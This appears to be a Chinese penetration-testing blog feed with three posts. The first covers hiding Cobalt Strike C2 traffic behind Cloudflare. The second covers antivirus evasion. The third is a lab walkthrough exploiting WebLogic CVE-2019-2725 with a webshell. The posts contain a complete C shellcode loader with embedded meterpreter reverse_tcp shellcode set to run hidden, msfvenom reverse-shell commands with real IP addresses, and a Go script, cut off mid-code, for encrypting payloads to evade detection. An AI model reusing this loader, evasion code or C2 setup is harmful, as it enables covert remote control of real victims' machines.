class="hljs-comment">;       </span><br>        base64url<span class="hljs-comment">;</span><br>        parameter <span class="hljs-string">&quot;__cfduid&quot;</span><span class="hljs-comment">;            </span><br>    &#125;<br>  <br>    output &#123;<br>        mask<span class="hljs-comment">;</span><br>        base64url<span class="hljs-comment">;</span><br>        print<span class="hljs-comment">;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>  修改Server</p><blockquote><p>header “Content-Type” “application&#x2F;javascript; charset&#x3D;utf-8”;</p></blockquote><p>  为</p><blockquote><p>header “Content-Type” “application&#x2F;*; charset&#x3D;utf-8”;</p></blockquote><p>修改完成之后使用cs 自带的c2lint 对profile 语法进行检查，没有报错的话就说明配置没有问题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c2lint</span> c2.<span class="hljs-number">4</span>.<span class="hljs-number">7</span>.profile<br><br></code></pre></td></tr></table></figure><h2 id="修改CDN配置"><a href="#修改CDN配置" class="headerlink" title="修改CDN配置"></a>修改CDN配置</h2><p>在这个Proﬁle中，我们请求的URI是以.js结尾的，Cloudﬂare作为一个CDN肯定要去缓存它，但这样的  话请求就无法到达我们的CS服务器，自然也就无法上线了。  </p><p>启用开发模式并清除缓存。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219112235726.png" alt="image-20240219112235726"></p><p>规则，添加页面规则  </p><p>选取设置：缓存级别，绕过</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219112256368.png" alt="image-20240219112256368"></p><h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><p>  使用修改好的proﬁle启动CS  </p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">./teamserver <span class="hljs-number">124</span>.<span class="hljs-number">71</span>.<span class="hljs-number">45</span>.<span class="hljs-number">28</span> cs44 <span class="hljs-built_in">c2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">7</span>.profile<br></code></pre></td></tr></table></figure><p>  对CS的listener进行配置。  </p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/image-20240219112339653.png" alt="image-20240219112339653"></p><p>  生成木马，在PC运行，成功上线  </p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>免杀</title>
    <link href="/2024/01/29/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/"/>
    <url>/2024/01/29/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文章只是提及概念</p><h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="免杀的概念"><a href="#免杀的概念" class="headerlink" title="免杀的概念"></a>免杀的概念</h2><blockquote><p>免杀技术全称为反杀毒技术Anti Anti-Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。 – 百度百科</p></blockquote><h2 id="常见的免杀方式"><a href="#常见的免杀方式" class="headerlink" title="常见的免杀方式"></a>常见的免杀方式</h2><ul><li>静态查杀：对文件进行特征匹配的思路  </li><li>云查杀：对文件内容及行为的检测 </li><li>动态查杀：对其产生的行为进行检测</li></ul><h2 id="杀软检测技术介绍"><a href="#杀软检测技术介绍" class="headerlink" title="杀软检测技术介绍"></a>杀软检测技术介绍</h2><ol><li><p>基于签名的检测</p><p>当恶意软件被杀软公司采集后，杀软后台的研究人员以及动态分析系统便会对这些样本进行分析，一旦确定是恶意软件，后台便会提取恶意文件的标签并将其添加到反病毒软件的签名数据库中</p></li><li><p>静态程序分析</p><p>静态程序分析是在不实际运行程序的情况下进行的分析。大部份的静态程序分析的对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p></li><li><p>动态程序分析</p><p>动态程序分析是通过在真实或虚拟处理器上执行程序而执行的分析。为了使动态程序分析真实可信，  我们必须要能够对各种目标程序的行为进行测试。  </p></li><li><p>沙盒分析技术</p><p>沙盒是一个观察计算机病毒的重要环境，用于为一些来源不可信、具备破坏力或无法判定程序意图的  程序提供试验环境。  </p></li><li><p>启发式分析</p><p>启发式分析是许多计算机防病毒软件使用的一种方法，其被设计用于检测未知的计算机病毒，以及新  的病毒变体。  </p><p>启发式分析是基于专家的分析，利用它可以对已知或未知的恶意软件进行各种维度的风险衡量，其中多标准分析（MCA）是其中的方法之一，不过启发式分析不是统计分析而是基于可用的数据或统计。</p></li><li><p>信息熵检测</p></li></ol><p>   每个恶意软件都可以被描述成数值性质的属性(例如:信息熵)或者抽象性质的属性，信息熵就是通过找到最合适的量度来验证并且对比恶意软件的属性。</p><ol start="7"><li><p>其他常见的检测技术</p><ul><li><p>混淆检测</p><p>病毒由两个部分组成：payload 和 混淆部件(obfuscator)</p><p>载荷是用来做坏事的代码，而混淆部件则是病毒用来保护自身免于被查杀的，通常恶意软件开发者都会将其代码进行混淆以降低其代  码的可读性  </p></li><li><p>加壳</p><p>  恶意软件一般都会被压缩加壳，因为加壳会将可执行文件进行压缩打包, 并将压缩数据与解压缩代码组  合成单个可执行文件的一种手段。 当执行被压缩过的可执行文件时，解压缩代码会在执行之前从压缩  数据中重新创建原始代码。所以检测恶意软件是否使用了加壳技术，也是发现的一种重要手段。  </p></li><li><p>加密检测</p><blockquote><p>  恶意软件使用加密对其二进制程序进行加密，以免被逆向分析。加密存在于恶意软件的构建器和存根  中，当恶意软件需要解密时，不会用恶意代码常用的正常方法执行它。为了隐藏进程，恶意软件使用  了一个有名的RunPE的技术，代码会以挂起的方式执行一个干净的进程（比如iexplorer.exe或者  explorer.exe），然后把内存内容修改成恶意代码后再执行。所以检测RunPE的运行，就可以很容易的  检测到恶意软件了。</p></blockquote></li></ul></li></ol><h2 id="常见的免杀方式-1"><a href="#常见的免杀方式-1" class="headerlink" title="常见的免杀方式"></a>常见的免杀方式</h2><ol><li><p>特征码免杀</p></li><li><p>花指令免杀</p></li><li><p>加壳免杀</p></li><li><p>分离免杀</p><p>就是使用sehllcode 和 shellcode loader </p></li><li><p>资源修改</p></li></ol><h2 id="推荐教程"><a href="#推荐教程" class="headerlink" title="推荐教程"></a>推荐教程</h2><blockquote><p>  <a href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus</a>  </p></blockquote><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>shellcode 就是生成的16进制机器码，用于完成某一些动作，由于通常会使用者会获取shell所以称之为shellcode</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/image-20240129234311368.png" alt="image-20240129234311368"></p><p>就是普通的payload 然后只不过是制定了文件而已</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-comment">#include &lt;Windows.h&gt;</span><br><span class="hljs-comment">#include &lt;stdio.h&gt;</span><br><span class="hljs-comment">#include &lt;string.h&gt;</span><br><span class="hljs-comment">#pragma comment(linker, &quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;) //隐藏控制台窗口（一）</span><br><br><span class="hljs-comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=139.155.49.43 lport=6666 -f c</span><br><br><span class="hljs-variable">unsigned</span> <span class="hljs-variable">char</span> <span class="hljs-variable">buf</span>[] <span class="hljs-operator">=</span><br>    <span class="hljs-string">&quot;\xfc\xe8\x8f<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x60</span><span class="hljs-char escape_">\x31</span>\xd2<span class="hljs-char escape_">\x89</span>\xe5<span class="hljs-char escape_">\x64</span>\x8b<span class="hljs-char escape_">\x52</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x30</span>\x8b<span class="hljs-char escape_">\x52</span>\x0c\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x14</span><span class="hljs-char escape_">\x31</span>\xff\x0f\xb7\x4a<span class="hljs-char escape_">\x26</span>\x8b&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x31</span>\xc0\xac\x3c<span class="hljs-char escape_">\x61</span>\x7c<span class="hljs-char escape_">\x02</span>\x2c<span class="hljs-char escape_">\x20</span>\xc1\xcf\x0d&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x75</span>\xef<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x57</span>\x8b<span class="hljs-char escape_">\x52</span><span class="hljs-char escape_">\x10</span>\x8b<span class="hljs-char escape_">\x42</span>\x3c<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd0\x8b<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x78</span><span class="hljs-char escape_">\x85</span>\xc0<span class="hljs-char escape_">\x74</span>\x4c<span class="hljs-char escape_">\x01</span>\xd0\x8b<span class="hljs-char escape_">\x48</span><span class="hljs-char escape_">\x18</span>\x8b&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x01</span>\xd3<span class="hljs-char escape_">\x85</span>\xc9<span class="hljs-char escape_">\x74</span>\x3c<span class="hljs-char escape_">\x49</span>\x8b<span class="hljs-char escape_">\x34</span>\x8b<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd6<span class="hljs-char escape_">\x31</span>\xff<span class="hljs-char escape_">\x31</span>\xc0\xac\xc1\xcf\x0d<span class="hljs-char escape_">\x01</span>\xc7<span class="hljs-char escape_">\x38</span>\xe0<span class="hljs-char escape_">\x75</span>&quot;</span><br>    <span class="hljs-string">&quot;\xf4<span class="hljs-char escape_">\x03</span>\x7d\xf8\x3b\x7d<span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x75</span>\xe0<span class="hljs-char escape_">\x58</span>\x8b<span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd3<span class="hljs-char escape_">\x66</span>\x8b\x0c\x4b\x8b<span class="hljs-char escape_">\x58</span>\x1c<span class="hljs-char escape_">\x01</span>\xd3\x8b<span class="hljs-char escape_">\x04</span>\x8b<span class="hljs-char escape_">\x01</span>&quot;</span><br>    <span class="hljs-string">&quot;\xd0<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x44</span><span class="hljs-char escape_">\x24</span><span class="hljs-char escape_">\x24</span>\x5b\x5b<span class="hljs-char escape_">\x61</span><span class="hljs-char escape_">\x59</span>\x5a<span class="hljs-char escape_">\x51</span>\xff\xe0<span class="hljs-char escape_">\x58</span>&quot;</span><br>    <span class="hljs-string">&quot;\x5f\x5a\x8b<span class="hljs-char escape_">\x12</span>\xe9<span class="hljs-char escape_">\x80</span>\xff\xff\xff\x5d<span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x32</span><span class="hljs-char escape_">\x00</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x77</span><span class="hljs-char escape_">\x73</span><span class="hljs-char escape_">\x32</span>\x5f<span class="hljs-char escape_">\x54</span><span class="hljs-char escape_">\x68</span>\x4c<span class="hljs-char escape_">\x77</span><span class="hljs-char escape_">\x26</span><span class="hljs-char escape_">\x07</span><span class="hljs-char escape_">\x89</span>\xe8&quot;</span><br>    <span class="hljs-string">&quot;\xff\xd0\xb8<span class="hljs-char escape_">\x90</span><span class="hljs-char escape_">\x01</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x29</span>\xc4<span class="hljs-char escape_">\x54</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x29</span><span class="hljs-char escape_">\x80</span>&quot;</span><br>    <span class="hljs-string">&quot;\x6b<span class="hljs-char escape_">\x00</span>\xff\xd5\x6a\x0a<span class="hljs-char escape_">\x68</span>\xc0\xa8\x4f\x8a<span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x00</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x26</span>\xe3<span class="hljs-char escape_">\x89</span>\xe6<span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\xea&quot;</span><br>    <span class="hljs-string">&quot;\x0f\xdf\xe0\xff\xd5<span class="hljs-char escape_">\x97</span>\x6a<span class="hljs-char escape_">\x10</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x99</span>\xa5<span class="hljs-char escape_">\x74</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x61</span>\xff\xd5<span class="hljs-char escape_">\x85</span>\xc0<span class="hljs-char escape_">\x74</span>\x0a\xff\x4e<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x75</span>\xec\xe8<span class="hljs-char escape_">\x67</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span>\xd9\xc8\x5f&quot;</span><br>    <span class="hljs-string">&quot;\xff\xd5<span class="hljs-char escape_">\x83</span>\xf8<span class="hljs-char escape_">\x00</span>\x7e<span class="hljs-char escape_">\x36</span>\x8b<span class="hljs-char escape_">\x36</span>\x6a<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x10</span>&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x56</span>\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x58</span>\xa4<span class="hljs-char escape_">\x53</span>\xe5\xff\xd5<span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x53</span>&quot;</span><br>    <span class="hljs-string">&quot;\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x53</span><span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x02</span>\xd9\xc8\x5f\xff\xd5<span class="hljs-char escape_">\x83</span>\xf8&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span>\x7d<span class="hljs-char escape_">\x28</span><span class="hljs-char escape_">\x58</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x00</span>\x6a<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x50</span><span class="hljs-char escape_">\x68</span>\x0b&quot;</span><br>    <span class="hljs-string">&quot;\x2f\x0f<span class="hljs-char escape_">\x30</span>\xff\xd5<span class="hljs-char escape_">\x57</span><span class="hljs-char escape_">\x68</span><span class="hljs-char escape_">\x75</span>\x6e\x4d<span class="hljs-char escape_">\x61</span>\xff\xd5\x5e&quot;</span><br>    <span class="hljs-string">&quot;\x5e\xff\x0c<span class="hljs-char escape_">\x24</span>\x0f<span class="hljs-char escape_">\x85</span><span class="hljs-char escape_">\x70</span>\xff\xff\xff\xe9\x9b\xff\xff&quot;</span><br>    <span class="hljs-string">&quot;\xff<span class="hljs-char escape_">\x01</span>\xc3<span class="hljs-char escape_">\x29</span>\xc6<span class="hljs-char escape_">\x75</span>\xc1\xc3\xbb\xf0\xb5\xa2<span class="hljs-char escape_">\x56</span>\x6a&quot;</span><br>    <span class="hljs-string">&quot;<span class="hljs-char escape_">\x00</span><span class="hljs-char escape_">\x53</span>\xff\xd5&quot;</span>;<br><br>int <span class="hljs-title function_">main</span>()<br>&#123;<br>    <span class="hljs-comment">//    void* Memory; //等价于PVOID，无类型指针</span><br>    <span class="hljs-variable">PVOID</span> <span class="hljs-title class_">Memory</span> <span class="hljs-operator">=</span> <span class="hljs-variable">NULL</span>; <span class="hljs-comment">// P表示指针，PVOID表示 void * 无类型指针</span><br>    <span class="hljs-title class_">Memory</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">VirtualAlloc</span>(<span class="hljs-variable">NULL</span>, <span class="hljs-title function_">sizeof</span>(<span class="hljs-variable">buf</span>), <span class="hljs-variable">MEM_COMMIT</span> <span class="hljs-operator">|</span> <span class="hljs-variable">MEM_RESERVE</span>, <span class="hljs-variable">PAGE_EXECUTE_READWRITE</span>);<br>    <span class="hljs-comment">//    ShowWindow(GetConsoleWindow(), SW_HIDE);  //隐藏控制台窗口（二）</span><br>    <span class="hljs-title function_">memcpy</span>(<span class="hljs-title class_">Memory</span>, <span class="hljs-variable">buf</span>, <span class="hljs-title function_">sizeof</span>(<span class="hljs-variable">buf</span>));<br>    ((<span class="hljs-title function_">void</span> (<span class="hljs-operator">*</span>)())<span class="hljs-title class_">Memory</span>)();<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="常见的工具"><a href="#常见的工具" class="headerlink" title="常见的工具"></a>常见的工具</h1><blockquote><ol><li><a href="https://github.com/Anyyy111/killEscaper">Anyyy111&#x2F;killEscaper: Shellcode 免杀生成器 绕过火绒、360（Windows版本） (github.com)</a></li><li><a href="https://github.com/SaadAhla/D1rkLdr">SaadAhla&#x2F;D1rkLdr: Shellcode Loader with Indirect Dynamic syscall Implementation , shellcode in MAC format, API resolving from PEB, Syscall calll and syscall instruction address resolving at run time (github.com)</a></li><li><a href="https://github.com/1y0n/AV_Evasion_Tool">1y0n&#x2F;AV_Evasion_Tool: 掩日 - 免杀执行器生成工具 (github.com)</a></li></ol></blockquote><h1 id="加载shellcode"><a href="#加载shellcode" class="headerlink" title="加载shellcode"></a>加载shellcode</h1>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RedSun02</title>
    <link href="/2024/01/27/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun02/"/>
    <url>/2024/01/27/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun02/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>开始时间 ： 2024-1-27 20:37</p><p>完全渗透 ： 2024-1-30 20:37 </p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下次一定记录</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>前提条件是我们已经获取了ip</p><blockquote><p>web 192.168.79.142</p></blockquote><p>那就直接扫描端口</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127205935184.png" alt="image-20240127205935184"></p><p>pc主机应该是有防火墙，所以扫描不到(这个后面不作为已知信息)</p><p>但是Windwos防火墙防止了ICMP，我们直接no ping 拿下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127210539172.png" alt="image-20240127210539172"></p><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><p>发现142主机有一个web服务</p><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127210831883.png" alt="image-20240127210831883"></p><p>嗯…什么都没有</p><p>发现存在445端口，永恒之蓝尝试利用一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127214129928.png" alt="image-20240127214129928"></p><p>。。。。</p><p>都失败</p><p>7001是weblogic的端口尝试扫描一下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240127214806454.png" alt="image-20240127214806454"></p><h2 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h2><p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">ruthlezs&#x2F;CVE-2019-2729-Exploit: CVE-2019-2729 Exploit Script (github.com)</a></p><p>发现利用失败，但是没有关系</p><h2 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h2><p><a href="https://github.com/TopScrew/CVE-2019-2725">TopScrew&#x2F;CVE-2019-2725: CVE-2019-2725命令回显+webshell上传+最新绕过 (github.com)</a></p><p>直接使用java反序列化工具</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127224117123.png" alt="image-20240127224117123"></p><p>修改为冰蝎的shell上传成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127230940285.png" alt="image-20240127230940285"></p><p>上传冰蝎的webshell</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127224350319.png" alt="image-20240127224350319"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240127231023530.png" alt="image-20240127231023530"></p><p>成功连接</p><h2 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/image-20240128161537058.png" alt="image-20240128161537058"></p><p>尝试直接使用msf利用CVE-2019-2725</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130140438141.png" alt="image-20240130140438141"></p><p>成功</p><p> 尝试使用简单的免杀</p><p>先生成一个原始的</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240130135524058.png" alt="image-20240130135524058"></p><p>然后使用下面的脚本进行加密</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;crypto/aes&quot;</span><br><span class="hljs-string">&quot;crypto/cipher&quot;</span><br><span class="hljs-string">&quot;encoding/base64&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CheckError</span><span class="hljs-params">(err <span class="hljs-type">error</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 填充字符串（末尾）</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">PaddingText1</span><span class="hljs-params">(str []<span class="hljs-type">byte</span>, blockSize <span class="hljs-type">int</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br><span class="hljs-comment">//需要填充的数据长度</span><br>paddingCount := blockSize - <span class="hljs-built_in">len</span>(str)%blockSize<br><span class="hljs-comment">//填充数据为：paddingCount ,填充的值为：paddingCount</span><br>paddingStr := bytes.Repeat([]<span class="hljs-type">byte</span>&#123;<span class="hljs-type">byte</span>(paddingCount)&#125;, paddingCount)<br>newPaddingStr := <span class="hljs-built_in">append</span>(str, paddingStr...)<br><span class="hljs-comment">//fmt.Println(newPaddingStr)</span><br><span class="hljs-keyword">return</span> newPaddingStr<br>&#125;<br><br><span class="hljs-comment">// DES加密</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">EncyptogAES</span><span class="hljs-params">(src, key []<span class="hljs-type">byte</span>)</span></span> []<span class="hljs-type">byte</span> &#123;<br>block, err := aes.NewCipher(key)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>src = PaddingText1(src, block.BlockSize())<br>blockMode := cipher.NewCBCEncrypter(block, key)<br>blockMode.CryptBlocks(src, src)<br><span class="hljs-keyword">return</span> src<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// payload替换</span><br><span class="hljs-comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.81.238 LPORT=6666 -f raw &gt; 6666.bin</span><br><span class="hljs-comment">// base64 -w 0 -i 6666.bin &gt; b64.txt</span><br><span class="hljs-comment">// cat b64.txt</span><br>str := <span 